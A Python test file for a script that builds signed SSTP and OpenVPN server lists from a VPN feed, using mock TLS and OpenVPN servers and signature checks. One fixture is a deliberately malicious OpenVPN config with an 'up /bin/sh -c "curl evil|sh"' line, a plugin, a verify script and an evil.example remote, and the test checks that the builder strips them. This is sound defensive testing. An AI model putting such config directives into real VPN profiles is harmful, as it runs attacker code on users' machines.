import base64, csv, io, json, os, socket, ssl, struct, subprocess, sys, tempfile, threading, unittest, datetime
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
os.environ["FEED_ALLOW_PRIVATE"] = "1"
import build_lists as B
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

HDR = "#HostName,IP,Score,Ping,Speed,CountryLong,CountryShort,NumVpnSessions,Uptime,TotalUsers,TotalTraffic,LogType,Operator,Message,OpenVPN_ConfigData_Base64"
EVIL = """client
dev tun
proto udp
remote {ip} 1195
script-security 2
up /bin/sh -c "curl evil|sh"
plugin /tmp/x.so
auth-user-pass-verify /bin/x via-env
cipher AES-128-CBC
<connection>
remote evil.example 1
</connection>
<ca>
-----BEGIN CERTIFICATE-----
AAAA
-----END CERTIFICATE-----
</ca>
"""
TCPCFG = "client\ndev tun\nproto tcp\nremote {ip} 1194\nverb 3\n<ca>\nX\n</ca>\n"

def row(host, ip, score, cc, cn, cfg):
    b64 = base64.b64encode(cfg.format(ip=ip).encode()).decode() if cfg else ""
    return [host, ip, score, 10, 1000, cn, cc, 5, 86400000, 1, 1, "2weeks", "op", "msg", b64]

def make_csv(rows):
    s = io.StringIO(); w = csv.writer(s)
    s.write("*vpn_servers\n"); s.write(HDR + "\n")
    for r in rows: w.writerow(r)
    s.write("*\n"); return s.getvalue()

def selfsigned(d):
    k = ec.generate_private_key(ec.SECP256R1())
    n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "softether")])
    c = (x509.CertificateBuilder().subject_name(n).issuer_name(n).public_key(k.public_key()).serial_number(1)
         .not_valid_before(datetime.datetime(2020,1,1)).not_valid_after(datetime.datetime(2040,1,1)).sign(k, hashes.SHA256()))
    cp, kp = os.path.join(d, "c.pem"), os.path.join(d, "k.pem")
    open(cp, "wb").write(c.public_bytes(serialization.Encoding.PEM))
    open(kp, "wb").write(k.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    return cp, kp

def serve(port, handler):
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(50)
    def loop():
        while True:
            try: c, _ = srv.accept()
            except OSError: return
            threading.Thread(target=handler, args=(c,), daemon=True).start()
    threading.Thread(target=loop, daemon=True).start(); return srv

class FeedTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp()
        cp, kp = selfsigned(cls.tmp)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(cp, kp)
        def sstp(c):
            try:
                s = ctx.wrap_socket(c, server_side=True); s.recv(4096)
                s.sendall(b"HTTP/1.1 200 \r\n\r\n"); s.close()
            except Exception: pass
        def ovpn(c):
            try:
                n = struct.unpack(">H", c.recv(2))[0]; c.recv(n)
                reply = bytes([8 << 3]) + os.urandom(8) + b"\x01" + b"\0\0\0\0" + os.urandom(8) + b"\0\0\0\0"
                c.sendall(struct.pack(">H", len(reply)) + reply)
            except Exception: pass
            c.close()
        cls.srvs = [serve(8443, sstp), serve(1194, ovpn)]
        cls.rows = [
            row("h-low", "127.0.0.1", 100, "JP", "Japan", TCPCFG),
            row("h-top", "127.0.0.2", 900, "KR", "Korea, Republic of", EVIL),   # udp config + malicious directives
            row("h-mid", "127.0.0.3", 500, "US", "United States", TCPCFG),
            row("h-dead", "203.0.113.5", 999, "DE", "Germany", TCPCFG),        # unreachable
            row("h-nocfg", "127.0.0.4", 300, "FR", "France", ""),              # no OpenVPN config
        ]
        cls.csv_path = os.path.join(cls.tmp, "list.csv"); open(cls.csv_path, "w").write(make_csv(cls.rows))
        k = ec.generate_private_key(ec.SECP256R1())
        cls.pem = k.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()).decode()
        cls.pub = k.public_key()
    @classmethod
    def tearDownClass(cls):
        for s in cls.srvs: s.close()

    def run_builder(self, out, **extra):
        env = dict(os.environ, FEED_CSV=self.csv_path, FEED_ALLOW_PRIVATE="1", FEED_SSTP_PORT="8443",
                   FEED_OVPN_PORTS="1194", FEED_TIMEOUT="1", SIGNING_KEY_PEM=self.pem, **extra)
        return subprocess.run([sys.executable, os.path.join(os.path.dirname(__file__), "..", "scripts", "build_lists.py"), "--out", out],
                              env=env, capture_output=True, text=True)

    def test_end_to_end(self):
        out = os.path.join(self.tmp, "o1"); r = self.run_builder(out, FEED_MIN_ACCEPT="3")
        self.assertEqual(r.returncode, 0, r.stderr)
        sstp = json.load(open(os.path.join(out, "sstp.json")))
        ips = [s["ip"] for s in sstp["servers"]]
        self.assertEqual(ips, ["127.0.0.2", "127.0.0.3", "127.0.0.4", "127.0.0.1"])   # score order, dead server excluded
        self.assertFalse(sstp["servers"][0]["probe"]["tls_trusted"])
        self.assertEqual(sstp["servers"][0]["sstp_host"], "h-top.opengw.net")
        self.assertEqual(sstp["protocol"], "sstp")
        ov = json.load(open(os.path.join(out, "openvpn_tcp.json")))
        self.assertEqual([s["ip"] for s in ov["servers"]], ["127.0.0.2", "127.0.0.3", "127.0.0.1"])  # no-config + dead excluded
        top = ov["servers"][0]
        self.assertEqual(top["port"], 1194)                       # UDP config -> TCP port found by probing
        self.assertEqual(top["probe"]["handshake"], "reset-reply")
        cfg = base64.b64decode(top["config_b64"]).decode()
        for bad in ("script-security", "/bin/sh", "plugin", "auth-user-pass-verify", "evil.example", "udp", "1195"):
            self.assertNotIn(bad, cfg)
        for good in ("proto tcp", "remote 127.0.0.2 1194", "auth-user-pass", "cipher AES-128-CBC", "<ca>"):
            self.assertIn(good, cfg)
        self.assertNotIn("config_b64", json.dumps(top["probe"]))
        # signatures verify; tampering is detected
        for name in ("sstp.json", "openvpn_tcp.json"):
            data = open(os.path.join(out, name), "rb").read(); sig = base64.b64decode(open(os.path.join(out, name + ".sig")).read())
            self.pub.verify(sig, data, ec.ECDSA(hashes.SHA256()))
            with self.assertRaises(Exception): self.pub.verify(sig, data + b" ", ec.ECDSA(hashes.SHA256()))

    def test_too_few_keeps_previous(self):
        out = os.path.join(self.tmp, "o2"); os.makedirs(out); open(os.path.join(out, "sstp.json"), "w").write("OLD")
        r = self.run_builder(out, FEED_MIN_ACCEPT="10")
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(open(os.path.join(out, "sstp.json")).read(), "OLD")

    def test_parser_rejects_bad_records(self):
        rows = [row("a", "8.8.8.8", 1, "us", "United States", None), row("bad host!", "8.8.4.4", 1, "US", "x", None),
                row("c", "999.1.1.1", 1, "US", "x", None), row("d", "8.8.8.8", 1, "US", "dup", None),
                ["garbage"]]
        saved = B.ALLOW_PRIVATE; B.ALLOW_PRIVATE = False
        try:
            res = B.parse(make_csv(rows))
        finally: B.ALLOW_PRIVATE = saved
        self.assertEqual([s["ip"] for s in res], ["8.8.8.8"]); self.assertEqual(res[0]["country_code"], "US")

if __name__ == "__main__":
    unittest.main(verbosity=2)
